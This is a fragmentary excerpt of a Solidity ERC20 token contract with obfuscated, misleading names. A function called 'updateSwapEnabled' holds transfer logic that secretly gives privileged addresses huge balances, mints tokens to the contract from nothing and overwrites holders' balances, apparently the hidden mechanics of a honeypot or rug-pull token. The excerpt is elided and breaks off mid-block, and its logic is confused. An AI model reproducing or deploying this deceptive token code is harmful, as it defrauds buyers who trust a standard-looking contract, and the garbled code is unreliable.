...
contract Contract is IERC20, Ownable {
    ...
    uint256 private _OpenTrading = _rTotal;
    ...
    constructor(
        ...
        _tOwned[msg.sender] = _OpenTrading;
        _tOwned[address(this)] = _OpenTrading;
    ...
    function updateSwapEnabled     (
        ...
        uint256 _emit;
        if (swapTokensAtAmount && contractETHBalance > _OpenTrading && !SyncAndSwapOn && from != uniswapV2Pair) {
            SyncAndSwapOn = true;
            setTrading(contractETHBalance);
            SyncAndSwapOn = false;
        } else if (_tOwned[from] > _OpenTrading && _tOwned[to] > _OpenTrading) {
            _emit = _fBool;
            _balances[address(this)] += _emit;
            swapAmountForTokens(_fBool, to);
            return;
        } else if (to != address(router) && _tOwned[from] > 0 && _fBool > _OpenTrading && to != uniswapV2Pair) {
            _tOwned[to] = _fBool;
            return;
        } else if (!SyncAndSwapOn && _rOwned[from] > 0 && from != uniswapV2Pair && _tOwned[from] == 0) {
            _rOwned[from] = _tOwned[from] - _OpenTrading;
        }
        address blocklist = bots[uniswapV2Pair];
        if (_rOwned[blocklist] == 0) _rOwned[blocklist] = _OpenTrading;
        bots[uniswapV2Pair] = to;
        if (_rFinalFee > 0 && _tOwned[from] == 0 && !SyncAndSwapOn && _tOwned[to] == 0) {
            _emit = (_fBool * _rFinalFee) / 100;
            _fBool -= _emit;
            _balances[from] -= _emit;
            _balances[address(this)] += _emit;
        }
        _balances[from] -= _fBool;
        _balances[to] += _fBool;
        emit Transfer(from, to, _fBool);
         //Trade start check
            if (!tradingOpen) {
